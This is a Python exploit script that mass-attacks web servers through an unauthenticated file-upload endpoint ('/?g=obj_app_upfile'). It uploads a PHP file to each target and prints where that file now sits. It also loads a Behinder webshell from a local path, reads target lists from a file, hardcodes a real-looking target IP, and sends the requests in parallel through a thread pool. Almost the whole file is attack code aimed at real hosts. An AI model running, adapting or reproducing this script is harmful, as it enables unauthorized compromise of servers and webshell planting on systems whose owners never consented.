import requests,threading,os,urllib3
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#fofa: 
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 Edg/113.0.1774.35',
}
filename = Path(__file__).name.strip('.py')
line_break = '\n'
file_path=Path(__file__).resolve().parent
result_path=file_path/'result'/f'{filename}.txt'
with open(r"D:\youxi\0x7eTools\Tools\WebShell\webshell_Manage\Behinder\Behinder_v4.0.6\server\default_aes\shell.php", "r") as f:
        file = f.read()
file_=file

def exploit(ip_, index):
    try:
        url = ip_+'/?g=obj_app_upfile'
        files = {"upfile": ("mike.php", '<?php phpinfo();?>'),
                 "MAX_FILE_SIZE":"10000000",
                 "submit_post":"obj_app_upfile",
                 "__hash__":"0b9d6b1ab7479ab69d9f71b05e0e9445",
            }
        # print(file_)
        burp0_headers = {"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc", "User-Agent": "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.0; Trident/4.0)"}
        burp0_data = "------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n10000000\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"upfile\"; filename=\"mj.php\"\r\nContent-Type: text/plain\r\n\r\n<?php phpinfo()?>\r\n\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"submit_post\"\r\n\r\nobj_app_upfile\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"__hash__\"\r\n\r\n0b9d6b1ab7479ab69d9f71b05e0e9445\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--\r\n"
        res=requests.post(url, headers=burp0_headers, data=burp0_data, timeout=8, verify=False)
        # res = requests.post(url,files=files, headers=headers, timeout=8, verify=False)

        print(f'{res} {len(res.text)} \n{index} {ip_}\n')
        print(ip_+"/attachements/mj.php")
        # with result_path.open('a+') as file:
            # file.write(ip_+line_break)

    except Exception as e:
        # print(e)
        pass

url='http://59.58.177.170:8090'
# exploit(url,1)


threads = []
with open(r'D:\Downloads\tmp\wangshen.txt', 'r') as file:
    # with result_path.open('r') as file:
    urls = []
    for index, line in enumerate(file):
        start = 100
        end = start+50

        if index >= start and index <= end:
            urls.append(line.strip(line_break))
            # if index==:
            # break
            ip = line.strip(line_break)
            print(index, ip)
            # exploit(ip,index)

            thread = threading.Thread(target=exploit, args=(ip, index,))
            threads.append(thread)
pool_size = 10
# print(urls)

test = 'm'

if test=='t':
    for thread in threads:
        thread.start()

    for thread in threads:
        thread.join()
elif test=='m':
    # 创建线程池
    with ThreadPoolExecutor(max_workers=pool_size) as executor:
        # 提交每个 URL 的请求任务
        futures = [executor.submit(exploit, url, index)
                   for index, url in enumerate(urls)]

        # 获取每个请求的结果
        for future in futures:
            result = future.result()